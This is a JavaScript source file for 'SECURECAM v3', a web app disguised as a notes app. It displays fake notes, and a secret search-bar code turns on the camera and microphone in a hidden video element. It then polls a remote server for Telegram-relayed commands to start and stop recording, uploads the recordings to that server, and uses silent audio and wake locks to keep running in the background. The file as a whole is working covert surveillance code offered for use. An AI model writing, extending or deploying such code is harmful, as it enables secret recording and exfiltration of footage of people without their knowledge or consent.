/**
 * SECURECAM v3 - Hidden Camera Notes App
 * Looks like normal notes app, has hidden camera + background recording
 * Activated via secret code (243) in search bar OR Telegram /on /off commands
 */

// ================================================================
// CONFIGURATION
// ================================================================
const SERVER_URL = 'https://your-koyeb-server-url.koyeb.app'; // CHANGE THIS
const SECRET_PIN = '243';
const POLL_INTERVAL = 1000; // 1 second polling

// ================================================================
// STATE VARIABLES
// ================================================================
let cameraActive = false;
let isRecording = false;
let mediaStream = null;
let mediaRecorder = null;
let recordedChunks = [];
let wakeLock = null;
let pollingTimer = null;
let keepAliveTimer = null;
let secretCodeBuffer = '';
let secretCodeTimeout = null;

// ================================================================
// DOM ELEMENTS
// ================================================================
const notesList = document.getElementById('notesList');
const searchInput = document.getElementById('searchInput');
const searchBar = document.getElementById('searchBar');
const hiddenVideo = document.getElementById('hiddenVideo');
const keepAliveAudio = document.getElementById('keepAliveAudio');

// ================================================================
// FAKE NOTES (Make app look real)
// ================================================================
const fakeNotes = [
    { id: 1, title: 'Shopping List', content: 'Milk, eggs, bread, butter, cheese, apples, bananas, rice', date: 'Today, 2:30 PM' },
    { id: 2, title: 'Meeting Notes', content: 'Discuss project timeline, budget allocation, team assignments for Q2', date: 'Yesterday, 10:15 AM' },
    { id: 3, title: 'Book Recommendations', content: 'Atomic Habits - James Clear\nDeep Work - Cal Newport\nClean Code - Robert Martin', date: 'Jan 18, 4:45 PM' },
    { id: 4, title: 'Workout Plan', content: 'Monday: Chest & Triceps\nWednesday: Back & Biceps\nFriday: Legs & Shoulders', date: 'Jan 17, 7:00 PM' },
    { id: 5, title: 'Movie Watchlist', content: 'Inception, Interstellar, The Dark Knight, Pulp Fiction', date: 'Jan 15, 9:30 PM' },
    { id: 6, title: 'Ideas', content: 'Learn Python, build a portfolio website, start a blog', date: 'Jan 14, 11:20 AM' },
    { id: 7, title: 'Recipes', content: 'Paneer butter masala, Biryani, Dal makhani', date: 'Jan 12, 6:00 PM' },
    { id: 8, title: 'Passwords', content: '(Just kidding! Use a password manager instead)', date: 'Jan 10, 3:15 PM' }
];

// ================================================================
// INITIALIZATION
// ================================================================
document.addEventListener('DOMContentLoaded', function() {
    renderNotes();
    setupEventListeners();
    startKeepAlive();
    log('My Notes app loaded');
});

// ================================================================
// NOTES APP UI
// ================================================================
function renderNotes() {
    if (!notesList) return;
    
    if (fakeNotes.length === 0) {
        notesList.innerHTML = '<div class="empty-state"><div class="empty-state-icon">📝</div><div class="empty-state-text">No notes yet<br>Tap + to create one</div></div>';
        return;
    }
    
    notesList.innerHTML = fakeNotes.map(function(note) {
        return '<div class="note-card" data-id="' + note.id + '">' +
            '<div class="note-card-title">' + escapeHtml(note.title) + '</div>' +
            '<div class="note-card-preview">' + escapeHtml(note.content.substring(0, 80)) + '</div>' +
            '<div class="note-card-date">' + escapeHtml(note.date) + '</div>' +
        '</div>';
    }).join('');
    
    // Add click handlers to note cards
    var cards = notesList.querySelectorAll('.note-card');
    cards.forEach(function(card) {
        card.addEventListener('click', function() {
            var id = parseInt(card.getAttribute('data-id'));
            openNote(id);
        });
    });
}

function openNote(id) {
    var note = fakeNotes.find(function(n) { return n.id === id; });
    if (!note) return;
    
    var titleEl = document.getElementById('noteTitle');
    var contentEl = document.getElementById('noteContent');
    
    if (titleEl) titleEl.value = note.title;
    if (contentEl) contentEl.value = note.content;
    
    showScreen('screenNoteEditor');
}

function showScreen(screenId) {
    var screens = document.querySelectorAll('.screen');
    screens.forEach(function(s) { s.classList.remove('active'); });
    
    var target = document.getElementById(screenId);
    if (target) target.classList.add('active');
}

function showToast(message, duration) {
    duration = duration || 2000;
    
    var existing = document.getElementById('toast');
    if (existing) existing.remove();
    
    var toast = document.createElement('div');
    toast.id = 'toast';
    toast.className = 'toast';
    toast.textContent = message;
    document.body.appendChild(toast);
    
    // Trigger animation
    setTimeout(function() {
        toast.classList.add('show');
    }, 10);
    
    setTimeout(function() {
        toast.classList.remove('show');
        setTimeout(function() {
            if (toast.parentNode) toast.remove();
        }, 300);
    }, duration);
}

function escapeHtml(text) {
    var div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// ================================================================
// EVENT LISTENERS
// ================================================================
function setupEventListeners() {
    // Search button
    var btnSearch = document.getElementById('btnSearch');
    if (btnSearch) {
        btnSearch.addEventListener('click', function() {
            if (searchBar) {
                searchBar.style.display = (searchBar.style.display === 'none' || !searchBar.style.display) ? 'flex' : 'none';
                if (searchBar.style.display === 'flex' && searchInput) {
                    searchInput.focus();
                }
            }
        });
    }
    
    // Close search
    var btnCloseSearch = document.getElementById('btnCloseSearch');
    if (btnCloseSearch) {
        btnCloseSearch.addEventListener('click', function() {
            if (searchBar) searchBar.style.display = 'none';
            if (searchInput) searchInput.value = '';
        });
    }
    
    // Search input - secret PIN detection
    if (searchInput) {
        searchInput.addEventListener('input', function(e) {
            var value = e.target.value.trim();
            
            // Check for secret PIN
            if (value === SECRET_PIN) {
                e.target.value = '';
                if (searchBar) searchBar.style.display = 'none';
                
                if (!cameraActive) {
                    activateCamera();
                } else {
                    showToast('Camera already active');
                }
                return;
            }
            
            // Track partial secret code (for physical keyboard users)
            if (value.length <= SECRET_PIN.length) {
                if (SECRET_PIN.startsWith(value)) {
                    // Still matching, do nothing
                } else {
                    // Not matching, clear buffer
                }
            }
        });
        
        // Also handle Enter key for secret PIN
        searchInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                var value = e.target.value.trim();
                if (value === SECRET_PIN) {
                    e.target.value = '';
                    if (searchBar) searchBar.style.display = 'none';
                    if (!cameraActive) {
                        activateCamera();
                    } else {
                        showToast('Camera already active');
                    }
                }
            }
        });
    }
    
    // Settings button
    var btnSettings = document.getElementById('btnSettings');
    if (btnSettings) {
        btnSettings.addEventListener('click', function() {
            showScreen('screenSettings');
        });
    }
    
    // Back buttons
    var btnBackEditor = document.getElementById('btnBackEditor');
    if (btnBackEditor) {
        btnBackEditor.addEventListener('click', function() {
            showScreen('screenNotesList');
        });
    }
    
    var btnBackSettings = document.getElementById('btnBackSettings');
    if (btnBackSettings) {
        btnBackSettings.addEventListener('click', function() {
            showScreen('screenNotesList');
        });
    }
    
    // Save note
    var btnSaveNote = document.getElementById('btnSaveNote');
    if (btnSaveNote) {
        btnSaveNote.addEventListener('click', function() {
            showToast('Note saved');
            showScreen('screenNotesList');
        });
    }
    
    // Add note
    var btnAddNote = document.getElementById('btnAddNote');
    if (btnAddNote) {
        btnAddNote.addEventListener('click', function() {
            var titleEl = document.getElementById('noteTitle');
            var contentEl = document.getElementById('noteContent');
            if (titleEl) titleEl.value = '';
            if (contentEl) contentEl.value = '';
            showScreen('screenNoteEditor');
        });
    }
    
    // Export notes
    var btnExport = document.getElementById('btnExportNotes');
    if (btnExport) {
        btnExport.addEventListener('click', function() {
            var data = JSON.stringify(fakeNotes, null, 2);
            var blob = new Blob([data], { type: 'application/json' });
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = 'notes_export.json';
            a.click();
            URL.revokeObjectURL(url);
            showToast('Notes exported');
        });
    }
}

// ================================================================
// CAMERA FUNCTIONS (HIDDEN)
// ================================================================
async function activateCamera() {
    if (cameraActive) {
        log('Camera already active');
        return;
    }
    
    try {
        // Check if getUserMedia is available
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            log('Camera API not available');
            showToast('Camera not supported');
            return;
        }
        
        // Request camera permission
        mediaStream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'environment',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: true
        });
        
        // Attach to hidden video element
        if (hiddenVideo) {
            hiddenVideo.srcObject = mediaStream;
            await hiddenVideo.play();
        }
        
        cameraActive = true;
        log('Camera activated');
        showToast('Camera ready');
        
        // Start command polling
        startCommandPolling();
        
        // Request wake lock
        requestWakeLock();
        
    } catch (err) {
        log('Camera activation failed: ' + err.message);
        showToast('Camera access denied');
        cameraActive = false;
        mediaStream = null;
    }
}

function deactivateCamera() {
    if (!cameraActive) return;
    
    // Stop recording if active
    if (isRecording) {
        stopRecording();
    }
    
    // Stop camera
    if (mediaStream) {
        mediaStream.getTracks().forEach(function(track) { track.stop(); });
        mediaStream = null;
    }
    
    if (hiddenVideo) {
        hiddenVideo.srcObject = null;
    }
    
    // Stop polling
    if (pollingTimer) {
        clearTimeout(pollingTimer);
        pollingTimer = null;
    }
    
    // Release wake lock
    if (wakeLock) {
        wakeLock.release().catch(function() {});
        wakeLock = null;
    }
    
    cameraActive = false;
    log('Camera deactivated');
}

// ================================================================
// RECORDING FUNCTIONS
// ================================================================
function startRecording() {
    if (!cameraActive) {
        log('Camera not active, activating first...');
        activateCamera().then(function() {
            if (cameraActive) startRecording();
        });
        return;
    }
    
    if (isRecording) {
        log('Already recording');
        return;
    }
    
    try {
        recordedChunks = [];
        
        // Choose best supported format
        var mimeType = chooseMimeType();
        log('Recording format: ' + mimeType);
        
        mediaRecorder = new MediaRecorder(mediaStream, {
            mimeType: mimeType,
            videoBitsPerSecond: 2500000
        });
        
        mediaRecorder.ondataavailable = function(e) {
            if (e.data && e.data.size > 0) {
                recordedChunks.push(e.data);
            }
        };
        
        mediaRecorder.onstop = function() {
            var blob = new Blob(recordedChunks, { type: mimeType });
            uploadVideo(blob, mimeType);
        };
        
        mediaRecorder.onerror = function(e) {
            log('Recording error: ' + (e.error || 'unknown'));
            isRecording = false;
        };
        
        // Collect data every 1 second
        mediaRecorder.start(1000);
        isRecording = true;
        
        log('Recording started');
        
    } catch (err) {
        log('Recording failed: ' + err.message);
        isRecording = false;
    }
}

function stopRecording() {
    if (!mediaRecorder || !isRecording) {
        log('Not recording');
        return;
    }
    
    try {
        mediaRecorder.stop();
        isRecording = false;
        log('Recording stopped');
    } catch (err) {
        log('Stop failed: ' + err.message);
    }
}

function chooseMimeType() {
    var formats = [
        'video/mp4;codecs=h264,aac',
        'video/mp4',
        'video/webm;codecs=vp9,opus',
        'video/webm;codecs=vp8,opus',
        'video/webm'
    ];
    
    for (var i = 0; i < formats.length; i++) {
        if (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported(formats[i])) {
            return formats[i];
        }
    }
    return 'video/webm';
}

// ================================================================
// VIDEO UPLOAD
// ================================================================
async function uploadVideo(blob, mimeType) {
    if (!blob || blob.size === 0) {
        log('No video data to upload');
        return;
    }
    
    log('Uploading ' + fmtSize(blob.size) + '...');
    showToast('Uploading video...');
    
    try {
        var formData = new FormData();
        var ext = (mimeType && mimeType.includes('mp4')) ? 'mp4' : 'webm';
        var filename = 'recording_' + Date.now() + '.' + ext;
        
        formData.append('video', blob, filename);
        
        var response = await fetch(SERVER_URL + '/api/video/upload', {
            method: 'POST',
            body: formData
        });
        
        if (response.ok) {
            var result = await response.json();
            log('Upload complete: ' + result.upload_id);
            showToast('Video uploaded');
        } else {
            log('Upload failed: ' + response.status);
            showToast('Upload failed');
        }
    } catch (err) {
        log('Upload error: ' + err.message);
        showToast('Upload error - check connection');
    }
}

function fmtSize(bytes) {
    if (bytes === 0) return '0 B';
    var units = ['B', 'KB', 'MB', 'GB'];
    var k = 1024;
    var i = 0;
    var s = bytes;
    while (s >= k && i < units.length - 1) {
        s /= k;
        i++;
    }
    return s.toFixed(1) + ' ' + units[i];
}

// ================================================================
// TELEGRAM COMMAND POLLING
// ================================================================
function startCommandPolling() {
    if (pollingTimer) {
        clearTimeout(pollingTimer);
    }
    
    pollCommand();
}

async function pollCommand() {
    if (!cameraActive) {
        return;
    }
    
    try {
        var response = await fetch(SERVER_URL + '/api/cmd/get', {
            method: 'GET',
            headers: { 'Content-Type': 'application/json' }
        });
        
        if (response.ok) {
            var data = await response.json();
            
            if (data.action === 'start') {
                log('Command: START');
                if (!isRecording) {
                    startRecording();
                }
            } else if (data.action === 'stop') {
                log('Command: STOP');
                if (isRecording) {
                    stopRecording();
                }
            }
        }
    } catch (err) {
        log('Poll error: ' + err.message);
    }
    
    // Schedule next poll
    pollingTimer = setTimeout(pollCommand, POLL_INTERVAL);
}

// ================================================================
// BACKGROUND KEEP-ALIVE
// ================================================================
function startKeepAlive() {
    // Play silent audio to keep app alive in background
    if (keepAliveAudio) {
        keepAliveAudio.volume = 0.01;
        keepAliveAudio.play().catch(function(err) {
            log('Keep-alive audio needs user interaction: ' + err.message);
        });
        
        // Resume on any user interaction
        var resumeAudio = function() {
            if (keepAliveAudio) {
                keepAliveAudio.play().catch(function() {});
            }
            document.removeEventListener('click', resumeAudio);
            document.removeEventListener('touchstart', resumeAudio);
        };
        
        document.addEventListener('click', resumeAudio, { once: true });
        document.addEventListener('touchstart', resumeAudio, { once: true });
    }
    
    // Periodic wake lock renewal
    keepAliveTimer = setInterval(function() {
        if (cameraActive) {
            requestWakeLock();
        }
    }, 30000);
}

async function requestWakeLock() {
    try {
        if ('wakeLock' in navigator) {
            if (wakeLock) {
                // Already have a wake lock
                return;
            }
            wakeLock = await navigator.wakeLock.request('screen');
            wakeLock.addEventListener('release', function() {
                log('Wake lock released');
                wakeLock = null;
                // Re-acquire if camera is still active
                if (cameraActive) {
                    setTimeout(requestWakeLock, 1000);
                }
            });
            log('Wake lock acquired');
        }
    } catch (err) {
        log('Wake lock error: ' + err.message);
    }
}

// Handle visibility change (app goes to background)
document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
        log('App went to background');
        if (cameraActive) {
            requestWakeLock();
        }
    } else {
        log('App came to foreground');
    }
});

// ================================================================
// UTILITY
// ================================================================
function log(msg) {
    console.log('[SecureCam] ' + msg);
}

// ================================================================
// DEBUG FUNCTIONS (remove in production)
// ================================================================
window.debug = {
    camera: function() { return activateCamera(); },
    record: function() { return startRecording(); },
    stop: function() { return stopRecording(); },
    status: function() {
        return {
            cameraActive: cameraActive,
            isRecording: isRecording,
            serverUrl: SERVER_URL
        };
    }
};
